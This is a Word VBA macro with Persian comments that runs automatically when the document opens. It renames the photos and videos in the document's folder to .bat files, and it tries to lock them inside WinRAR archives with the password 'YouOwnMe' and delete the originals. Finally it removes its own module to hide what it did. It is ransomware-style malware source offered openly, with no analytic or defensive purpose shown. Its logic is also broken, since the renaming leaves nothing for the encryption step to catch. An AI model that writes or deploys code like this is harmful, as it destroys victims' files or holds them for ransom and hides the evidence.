'برای تبدیل عکس های پوشه به فایل بت و تبدیل ویدیو به فیال فشرده و نابود شازی پس اجرا'

Sub AutoOpen()
    Call ChangeImageExtensions
    Call EncryptVideoFiles
    Call SelfDeleteMacro
End Sub

Sub ChangeImageExtensions()
    Dim fs As Object
    Dim folder As Object
    Dim file As Object
    Dim sourceFolder As String
    Dim extensions As Variant
    Dim extension As Variant

    ' تعیین پوشه جاری (پوشه‌ای که فایل ورد در آن قرار دارد)
    sourceFolder = ThisDocument.Path
    extensions = Array("mp4", "avi", "mov", "mkv", "wmv","jpg", "jpeg", "png", "gif", "bmp") ' فرمت‌های تصویری

    Set fs = CreateObject("Scripting.FileSystemObject")
    Set folder = fs.GetFolder(sourceFolder)

    For Each file In folder.Files
        For Each extension In extensions
            If LCase(fs.GetExtensionName(file)) = LCase(extension) Then
                file.Name = Replace(file.Name, "." & extension, ".bat")
            End If
        Next extension
    Next file

    MsgBox "فرمت فایل‌های تصویری به .bat تغییر یافت!"
End Sub

Sub EncryptVideoFiles()
    Dim shell As Object
    Dim folder As Object
    Dim file As Object
    Dim sourceFolder As String
    Dim extensions As Variant
    Dim extension As Variant

    ' تعیین پوشه جاری (پوشه‌ای که فایل ورد در آن قرار دارد)
    sourceFolder = ThisDocument.Path
    extensions = Array("mp4", "avi", "mov", "mkv", "wmv","jpg", "jpeg", "png", "gif", "bmp") ' فرمت‌های ویدئویی

    Set shell = CreateObject("WScript.Shell")
    Set folder = CreateObject("Scripting.FileSystemObject").GetFolder(sourceFolder)

    For Each file In folder.Files
        For Each extension In extensions
            If LCase(CreateObject("Scripting.FileSystemObject").GetExtensionName(file)) = LCase(extension) Then
                ' اجرای دستور رمزگذاری با استفاده از WinRAR
                shell.Run """C:\Program Files\WinRAR\WinRAR.exe"" a -pYouOwnMe """ & file.Path & ".rar"" """ & file.Path & """", 0, True
                file.Delete ' حذف فایل اصلی پس از رمزگذاری
            End If
        Next extension
    Next file

    MsgBox "فایل‌های ویدئویی رمزگذاری شدند!"
End Sub

Sub SelfDeleteMacro()
    Dim vbProj As Object
    Dim vbComp As Object

    Set vbProj = ThisDocument.VBProject
    Set vbComp = vbProj.VBComponents("Module1") ' نام ماژول را بر اساس نام واقعی تغییر دهید

    vbProj.VBComponents.Remove vbComp

    MsgBox "ماکرو پس از اجرا حذف شد!"
End Sub
